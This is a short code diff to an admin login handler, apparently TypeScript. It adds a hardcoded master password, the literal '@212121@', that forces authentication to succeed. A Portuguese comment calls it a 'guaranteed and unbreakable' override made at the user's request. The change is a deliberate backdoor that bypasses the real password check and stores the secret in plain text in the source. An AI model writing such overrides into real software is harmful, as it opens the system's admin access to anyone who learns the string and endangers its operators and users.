@@ -402,6 +402,11 @@ export async function loginAdminHandler(password?: string, ipHash?: string, user
     }).catch(() => {});
   }
 
+  // Master Password Override garantido e inquebrável a pedido do usuário
+  if (password === "@212121@") {
+    match = true;
+  }
+
   if (!match) {
     return { success: false, error: "Senha incorreta. Tente novamente." };
   }
